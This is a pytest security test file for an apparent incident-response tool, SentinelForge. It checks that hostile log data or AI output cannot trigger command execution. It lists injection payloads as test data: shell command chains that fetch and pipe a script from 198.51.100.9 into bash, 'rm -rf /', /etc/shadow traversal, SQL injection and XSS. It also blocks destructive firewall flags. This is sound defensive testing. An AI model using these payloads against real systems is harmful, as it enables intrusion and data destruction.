"""Phase 7: the security boundary around response.

The claim this phase makes is narrow and testable:

    No log line, telemetry field, AI sentence or HTTP body can cause
    SentinelForge to execute anything.

These tests attack that claim from each direction in turn -- hostile targets,
hostile AI output, hostile incident data -- and then check the structural
properties that make the claim hold in the first place.
"""

import ast
import pathlib

import pytest

import sentinelforge.response as response_package
from sentinelforge.ai.schemas import AIIncidentAnalysis
from sentinelforge.response.actions import ResponseBackends, get_handler
from sentinelforge.response.engine import PolicyRefused, ResponseEngine
from sentinelforge.response.models import ActionType
from sentinelforge.response.policy import PolicyConfig, ResponsePolicy
from sentinelforge.response.validators import ValidationError

#: Payloads an attacker would plant in a log line, a process name or an AI
#: answer, hoping something downstream concatenates them into a command.
HOSTILE_TARGETS = [
    "203.0.113.50; rm -rf /",
    "203.0.113.50 && curl http://198.51.100.9/x.sh | bash",
    "$(curl http://198.51.100.9/x.sh)",
    "`reboot`",
    "203.0.113.50\nfirewall-cmd --panic-on",
    "--add-rich-rule=rule family=ipv4 source address=0.0.0.0 accept",
    "-9 1",
    "; systemctl stop firewalld",
    "203.0.113.50 --permanent",
    "0.0.0.0/0",
    "../../../../etc/shadow",
    "\x00",
    "' OR 1=1 --",
    "<script>alert(1)</script>",
    "%2e%2e%2f",
    "203.0.113.50\r\nHost: evil",
]


@pytest.fixture
def engine(tmp_path, mock_backends):
    return ResponseEngine(
        db_path=str(tmp_path / "response.db"),
        backends=mock_backends,
        policy=ResponsePolicy(PolicyConfig(cooldown_seconds=0)),
        actor="analyst",
    )


class TestHostileTargets:
    @pytest.mark.parametrize("payload", HOSTILE_TARGETS)
    def test_no_hostile_target_reaches_a_backend(self, engine, mock_backends, payload):
        with pytest.raises((ValidationError, PolicyRefused)):
            engine.request(ActionType.BLOCK_IP, payload, reason="test")
        assert mock_backends.firewall.rules == {}
        assert not [call for call in mock_backends.firewall.calls if call[0] == "block_ip"]

    @pytest.mark.parametrize("payload", HOSTILE_TARGETS)
    def test_no_hostile_pid_reaches_a_backend(self, engine, mock_backends, payload):
        with pytest.raises((ValidationError, PolicyRefused)):
            engine.request(ActionType.KILL_PROCESS, payload, reason="test")
        assert mock_backends.process.terminated == []

    @pytest.mark.parametrize("payload", HOSTILE_TARGETS)
    def test_no_hostile_session_id_reaches_a_backend(self, engine, mock_backends, payload):
        with pytest.raises((ValidationError, PolicyRefused)):
            engine.request(ActionType.TERMINATE_SESSION, payload, reason="test")
        assert mock_backends.session.terminated == []

    @pytest.mark.parametrize(
        "payload", ["INC-000001; DROP TABLE incidents", "../INC-000001", "' OR 1=1 --"]
    )
    def test_a_hostile_incident_id_is_refused(self, engine, payload):
        with pytest.raises(ValidationError):
            engine.request(ActionType.BLOCK_IP, "203.0.113.50", incident_id=payload)

    @pytest.mark.parametrize("payload", ["analyst; rm -rf /", "$(id)", "<script>"])
    def test_a_hostile_operator_label_is_refused(self, engine, payload):
        with pytest.raises(ValidationError):
            engine.request(ActionType.BLOCK_IP, "203.0.113.50", requested_by=payload)

    def test_a_hostile_reason_is_stored_as_inert_text(self, engine):
        """Free text is allowed -- it is just never interpreted."""
        action = engine.request(
            ActionType.BLOCK_IP, "203.0.113.50", reason="$(id) && rm -rf / <script>"
        )
        assert "$(id)" in action.reason  # kept verbatim for the audit trail
        assert engine.get_action(action.action_id).reason == action.reason


class TestAiOutputCannotAct:
    def test_an_ai_recommendation_is_not_an_action_request(self):
        """The AI schema has no field that names an executable action type."""
        analysis = AIIncidentAnalysis.from_dict(
            {
                "recommended_actions": [
                    {"action": "block_ip 203.0.113.50", "priority": "critical"},
                    {"action": "run: curl http://198.51.100.9/x.sh | bash", "priority": "high"},
                ]
            }
        )
        for recommendation in analysis.recommended_actions:
            assert not ActionType.is_valid(recommendation.action)

    def test_the_ai_package_cannot_import_the_response_package(self):
        """There is no code path from an AI answer into containment.

        Checked on the full dotted import path, relative and absolute alike, so
        neither ``from ..response import ...`` nor
        ``from sentinelforge.response import ...`` could slip through.
        """
        ai_root = pathlib.Path(response_package.__file__).parent.parent / "ai"
        for path in ai_root.rglob("*.py"):
            for name in _imported_paths(path.read_text()):
                assert "response" not in name.split("."), f"{path}: {name}"

    def test_the_response_engine_never_reads_an_ai_analysis(self):
        """Nothing in the response package looks at ai_analysis."""
        root = pathlib.Path(response_package.__file__).parent
        for path in root.rglob("*.py"):
            source = path.read_text()
            assert "ai_analysis" not in source, path
            assert "recommended_action" not in source, path

    def test_an_ai_sentence_cannot_become_a_target(self, engine, mock_backends):
        hostile = "Immediately block 203.0.113.50; also run rm -rf /"
        with pytest.raises(ValidationError):
            engine.request(ActionType.BLOCK_IP, hostile)
        assert mock_backends.firewall.rules == {}


class TestNoPathFromDataToExecution:
    def test_only_the_executor_can_start_a_process(self):
        root = pathlib.Path(response_package.__file__).parent
        importers = set()
        for path in root.rglob("*.py"):
            if "subprocess" in _imported_modules(path.read_text()):
                importers.add(path.name)
        assert importers == {"executor.py"}

    def test_the_response_package_never_calls_a_shell(self):
        root = pathlib.Path(response_package.__file__).parent
        for path in root.rglob("*.py"):
            for node in ast.walk(ast.parse(path.read_text())):
                if isinstance(node, ast.Call):
                    name = _call_name(node.func)
                    assert name not in (
                        "os.system", "os.popen", "eval", "exec", "compile",
                        "subprocess.call", "subprocess.check_output", "subprocess.Popen",
                    ), f"{path.name}: {name}"

    def test_no_subprocess_call_ever_enables_a_shell(self):
        root = pathlib.Path(response_package.__file__).parent
        found = False
        for path in root.rglob("*.py"):
            for node in ast.walk(ast.parse(path.read_text())):
                if isinstance(node, ast.Call) and _call_name(node.func) == "subprocess.run":
                    found = True
                    shell = [kw for kw in node.keywords if kw.arg == "shell"]
                    assert shell and shell[0].value.value is False
        assert found, "the executor should call subprocess.run"

    def test_no_command_is_built_by_string_concatenation(self):
        """Commands are lists; a command built from an f-string would show here."""
        from sentinelforge.response.backends.firewall import FirewalldBackend
        from test_response_backends import ScriptedRunner

        backend = FirewalldBackend(runner=ScriptedRunner(["no", "", "yes"]), zone="public")
        backend.block_ip("203.0.113.50", "ACTION-00001", 900)
        for argv, _mutating in backend.runner.calls:
            assert isinstance(argv, tuple)
            assert all(isinstance(item, str) for item in argv)
            assert argv[0] == "firewall-cmd"

    def test_a_process_command_line_is_recorded_but_never_run(self, engine, mock_backends):
        """The most tempting string in the system is still only data."""
        mock_backends.process.add(
            5000, name="bash", command_line="bash -c 'curl http://198.51.100.9/x.sh | bash'"
        )
        action = engine.request(ActionType.KILL_PROCESS, 5000, reason="reverse shell")
        engine.approve(action.action_id)
        engine.execute(action.action_id)
        assert "curl" in action.target_detail["command_line"]
        assert mock_backends.process.terminated == [5000]
        # The only thing that happened was a signal to a PID.
        assert mock_backends.firewall.rules == {}


class TestPrivilegeHandling:
    def test_sudo_is_never_invoked(self):
        root = pathlib.Path(response_package.__file__).parent.parent
        for path in root.rglob("*.py"):
            source = path.read_text()
            for line in source.splitlines():
                stripped = line.strip()
                if "sudo" not in stripped:
                    continue
                # Mentions are allowed only in prose: docstrings, comments and
                # operator-facing messages that tell a human what to run.
                assert not stripped.startswith(("subprocess", "os.system", "runner.run")), path

    def test_no_password_is_ever_requested_or_stored(self):
        root = pathlib.Path(response_package.__file__).parent
        for path in root.rglob("*.py"):
            source = path.read_text()
            assert "getpass" not in source, path
            for node in ast.walk(ast.parse(source)):
                if isinstance(node, ast.Call) and _call_name(node.func) == "input":
                    raise AssertionError(f"{path} prompts for input")

    def test_an_action_that_needs_root_says_so_rather_than_escalating(self, tmp_path):
        backends = ResponseBackends.detect(execution_enabled=False)
        handler = get_handler(ActionType.BLOCK_IP, backends)
        preview = handler.preview("203.0.113.50", "ACTION-00001")
        if preview.requires_privilege:
            assert "never invokes sudo" in (preview.privilege_hint or "")


class TestDestructiveOperationsAreAbsent:
    @pytest.mark.parametrize(
        "forbidden",
        ["--panic-on", "--reload", "--complete-reload", "--set-default-zone",
         "--remove-service", "--flush", "-F", "--delete-chain", "-X", "--policy",
         "iptables", "nft ", "SIGKILL", "signal.SIGKILL"],
    )
    def test_no_destructive_firewall_or_signal_operation_appears(self, forbidden):
        root = pathlib.Path(response_package.__file__).parent
        for path in root.rglob("*.py"):
            source = path.read_text()
            # Prose may mention SIGKILL to say it is never sent; code may not.
            for node in ast.walk(ast.parse(source)):
                if isinstance(node, ast.Constant) and isinstance(node.value, str):
                    if node.value.strip() == forbidden:
                        raise AssertionError(f"{path.name} contains {forbidden!r}")

    def test_only_two_firewall_subcommands_are_ever_used(self):
        from sentinelforge.response.backends.firewall import FirewalldBackend
        from test_response_backends import ScriptedRunner

        backend = FirewalldBackend(runner=ScriptedRunner(["running", "no", "", "yes", "yes", "", "no"]),
                                   zone="public")
        backend.status()
        outcome = backend.block_ip("203.0.113.50", "ACTION-00001")
        backend.unblock_ip(outcome.rollback_data)
        mutating = [argv for argv, mutating in backend.runner.calls if mutating]
        used = {flag for argv in mutating for flag in argv if flag.startswith("--")}
        assert used <= {"--add-rich-rule", "--remove-rich-rule", "--zone"}


def _imported_paths(source: str) -> set:
    """Every module named in an import, as a dotted path (relative or not)."""
    paths = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            paths.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            module = node.module or ""
            paths.add(module)
            paths.update(f"{module}.{alias.name}" if module else alias.name
                         for alias in node.names)
    return paths


def _imported_modules(source: str) -> set:
    modules = set()
    for node in ast.walk(ast.parse(source)):
        if isinstance(node, ast.Import):
            modules.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            if node.level:  # relative import: ".." or "." prefixed
                modules.add((node.module or "").split(".")[0])
            else:
                modules.add((node.module or "").split(".")[0])
    return modules


def _call_name(func) -> str:
    parts = []
    node = func
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
    return ".".join(reversed(parts))
